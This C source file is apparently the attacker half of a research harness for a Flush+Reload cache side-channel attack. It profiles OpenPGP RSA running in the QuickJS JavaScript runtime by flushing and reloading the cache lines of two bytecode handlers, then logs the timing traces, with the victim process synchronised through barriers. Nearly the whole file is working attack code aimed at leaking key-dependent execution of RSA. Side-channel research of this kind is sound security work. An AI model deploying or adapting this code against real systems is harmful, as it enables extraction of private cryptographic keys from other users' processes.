#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "flush_reload.h"
#include "shared_memory.h"

#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <x86intrin.h>

enum { cache_line_count = 2, profile_iterations = 1 << 20 };
static uint64_t victim_runs = 1;
static const char *test_name = "quickjs_openpgp_rsa_fr";
static const uint64_t max_exec_cycles = (uint64_t)3e9;

/* TBD: hardware-timing constant, needs empirical tuning on the target CPU
 * (same caveat as the PS goto8_base_freq/sar_base_freq constants).
 * Overridable via WAITING_TIME env var to allow sweeping without rebuilding. */
static uint64_t waiting_time = 20000;

static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];

static void FF_profile_openpgp_rsa() {
	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		reload_time[i] = reload_time_arr[i];
	}

	init_sync_ctx(QUICKJS_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier); /* matches victim's (A) */

	for (int i = 0; i < (int)victim_runs; ++i) {
		log_info("Attacker Iteration %d", i);

		sync_ctx_set_action(SYNC_CTX_START);
		/* matches victim's (B) [i==0] or (D) [i>0] */
		pthread_barrier_wait(sync_ctx.barrier);

		int index = 0;
		uint64_t tsc0 = rdtscp();
		while (index < profile_iterations &&
		       rdtscp() - tsc0 < max_exec_cycles) {
			FLUSH_CACHE_LINE(goto8, 1);
			FLUSH_CACHE_LINE(sar, 1);

			FR_wait(waiting_time);

			RELOAD_CACHE_LINE(goto8, 1, 0);
			RELOAD_CACHE_LINE(sar, 1, 1);

			++index;
		}

		if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
			log_warn("Profiling time/iteration not enough");
		}
		/* matches victim's (C), releases it to (D) */
		pthread_barrier_wait(sync_ctx.barrier);

		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      cache_line_count,
		                      index,
		                      i == 0);

		memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
		memset(reload_time_arr, 0, sizeof(reload_time_arr));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

int main(int argc, char **argv) {
	quickjs_get_bytecode_handler_cacheline();

	const char *env_victim_runs = getenv("VICTIM_RUNS");
	if (env_victim_runs != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_victim_runs, &endptr, 10);
		if (errno == 0 && endptr != env_victim_runs && *endptr == '\0') {
			victim_runs = value;
		}
	}

	const char *env_waiting_time = getenv("WAITING_TIME");
	if (env_waiting_time != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_waiting_time, &endptr, 10);
		if (errno == 0 && endptr != env_waiting_time && *endptr == '\0') {
			waiting_time = value;
		}
	}

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			victim_runs = value;
		} else {
			log_error("Invalid num_runs argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: victim_runs=%lu, waiting_time=%lu",
	         (unsigned long)victim_runs,
	         (unsigned long)waiting_time);

	FF_profile_openpgp_rsa();
	return 0;
}
